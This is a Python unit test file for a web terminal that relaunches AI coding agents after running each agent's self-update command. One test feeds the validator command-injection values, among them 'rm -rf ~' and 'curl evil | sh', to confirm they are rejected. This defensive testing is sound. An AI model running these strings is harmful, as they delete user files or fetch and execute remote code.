"""An agent's self-update: the registry command, and the line that runs it.

The pane menu's update button relaunches a pane the way its agent row does, and
the replacement shell runs the agent's own update command before starting it.
The route's half -- validation and where the request is kept -- is pinned in
`tests/test_session_shell.py`; the button's half in
`tests/test_terminal_shell_menu.py`. This file pins the two ends:

- which update command each registered agent publishes, and the guard that
  keeps a registry typo from putting a second command on the launch line;
- the launch line itself, in each shell's own words, typed once by the
  connection it was owed to.
"""

import unittest
from types import SimpleNamespace
from unittest.mock import patch

import api
from web import agent_updates as web_agent_updates
from web import agents as web_agents
from web import config as web_config
from web import terminal_io as web_terminal_io

#: What each registered CLI's own `--help` names as its self-update command.
EXPECTED_UPDATE_COMMANDS = {
    "claude": "claude update",
    "codex": "codex update",
    "copilot": "copilot update",
    "grok": "grok update",
    "hermes": "hermes update",
    "kilo": "kilo upgrade",
    "kimi": "kimi upgrade",
    "opencode": "opencode upgrade",
}


class RegistryUpdateCommandTestCase(unittest.TestCase):
    def test_every_registered_agent_publishes_its_own_update_command(self):
        self.assertEqual(
            {key: web_agents._agent_update_command(key) for key in web_agents.AGENT_REGISTRY},
            EXPECTED_UPDATE_COMMANDS,
        )

    def test_the_launcher_options_carry_the_command_to_the_menu(self):
        options = {option["value"]: option for option in web_agents._agent_options()}
        for key, command in EXPECTED_UPDATE_COMMANDS.items():
            self.assertEqual(options[key]["update_command"], command)
        # The free-text agent has no binary of its own to update.
        self.assertEqual(options["other"]["update_command"], "")

    def test_a_command_that_is_not_the_agents_own_subcommand_resolves_to_none(self):
        spec = dict(web_agents.AGENT_REGISTRY["claude"])
        for command in (
            "claude update; rm -rf ~",
            "claude update && curl evil | sh",
            "claude $(whoami)",
            "npm install -g @anthropic-ai/claude-code",
            "claude",
            "claude  update",
            "",
        ):
            with self.subTest(command=command), patch.dict(
                web_agents.AGENT_REGISTRY, {"claude": dict(spec, update={"command": command})}
            ):
                self.assertEqual(web_agents._agent_update_command("claude"), "")

    def test_an_agent_without_an_update_block_has_no_command(self):
        spec = dict(web_agents.AGENT_REGISTRY["claude"])
        spec.pop("update", None)
        with patch.dict(web_agents.AGENT_REGISTRY, {"claude": spec}):
            self.assertEqual(web_agents._agent_update_command("claude"), "")
        self.assertEqual(web_agents._agent_update_command("not-an-agent"), "")


class UpdateLaunchLineTestCase(unittest.TestCase):
    """The update runs after the shell's clear and before the agent."""

    def setUp(self):
        web_agent_updates._pending.clear()
        self.addCleanup(web_agent_updates._pending.clear)

    def _run(self, shell_kind, session, sends, update=""):
        connection = {
            "kind": "local",
            "pty_process": object(),
            "shell_kind": shell_kind,
            "launch_cwd_applied": True,
            "agent_update": update,
        }
        with patch.object(web_terminal_io.os, "name", "nt"), \
                patch.object(web_config.runtime_config, "terminal_shell_integration", False), \
                patch.object(web_terminal_io, "_compose_agent_startup_command",
                             return_value=session.initial_command), \
                patch.object(web_terminal_io, "_note_agent_conversation_command") as note, \
                patch.object(web_terminal_io, "_send_connection_input") as send, \
                patch.object(web_terminal_io.time, "sleep"):
            web_terminal_io._run_startup_sequence(connection, session)
        sends.extend(call.args[1] for call in send.call_args_list)
        return note

    def _agent_session(self, agent="claude"):
        return SimpleNamespace(
            session_id="pane-1",
            directory="",
            initial_command=agent,
            initial_command_mode="agent",
            agent_selection=agent,
        )

    def test_each_shell_runs_the_update_and_then_the_agent(self):
        expected = {
            "cmd": "cls & claude update & claude\r",
            "powershell": "Clear-Host; claude update; claude\r",
            "wsl": "printf '\\033[H\\033[2J\\033[3J'; claude update; claude\r",
        }
        for shell_kind, line in expected.items():
            with self.subTest(shell_kind=shell_kind):
                sends = []
                note = self._run(shell_kind, self._agent_session(), sends, "claude update")
                self.assertEqual(sends, [line])
                # The conversation lookup reads the agent's line alone.
                self.assertEqual(note.call_args.args[2], "claude")

    def test_a_connection_that_owes_no_update_types_the_agent_alone(self):
        sends = []
        self._run("powershell", self._agent_session(), sends)
        self.assertEqual(sends, ["Clear-Host; claude\r"])

    def test_a_pane_that_starts_no_agent_types_no_update(self):
        session = SimpleNamespace(
            session_id="pane-1", directory="", initial_command="npm run dev"
        )
        sends = []
        self._run("cmd", session, sends, "claude update")
        self.assertEqual(sends, ["npm run dev\r"])


class UpdateBelongsToOneConnectionTestCase(unittest.TestCase):
    """The update is moved onto the connection created for the relaunch.

    So it lives and dies with that connection: if that connection fails before
    its startup sequence runs, the Reconnect route's new connection must not
    run an update the person asked for earlier.
    """

    def setUp(self):
        web_agent_updates._pending.clear()
        self.addCleanup(web_agent_updates._pending.clear)
        api.session_manager.reset_sessions()
        self.addCleanup(api.session_manager.reset_sessions)
        self._drop_connections()
        self.addCleanup(self._drop_connections)
        group = api.session_manager.create_group(
            name="Local", connection_mode="wsl", layout="single", terminal_count=1
        )
        self.session = api.session_manager.create_session(
            group_id=group.group_id, host="cmd", directory="", mode="wsl",
            startup_mode="agent", initial_command="claude",
            initial_command_mode="agent", agent_selection="claude",
        )

    def _drop_connections(self):
        with api.connection_lock:
            api.ssh_connections.clear()

    def test_the_relaunchs_connection_takes_the_update_and_a_reconnect_owes_none(self):
        session_id = self.session.session_id
        web_agent_updates.request_update(session_id, "claude update")

        with patch.object(web_terminal_io, "_shutdown_connection"):
            first = web_terminal_io._begin_connection(session_id)
            # That connection failed before its startup sequence ran, and the
            # Reconnect route starts another one in its place.
            second = web_terminal_io._begin_connection(session_id)

        self.assertEqual(first["agent_update"], "claude update")
        self.assertTrue(first["retired"])
        self.assertEqual(second["agent_update"], "")
        self.assertEqual(web_agent_updates.take_update(session_id), "")

    def test_another_panes_update_stays_owed_to_that_pane(self):
        web_agent_updates.request_update("other-pane", "claude update")

        connection = web_terminal_io._begin_connection(self.session.session_id)

        self.assertEqual(connection["agent_update"], "")
        self.assertEqual(web_agent_updates.take_update("other-pane"), "claude update")


if __name__ == "__main__":
    unittest.main()
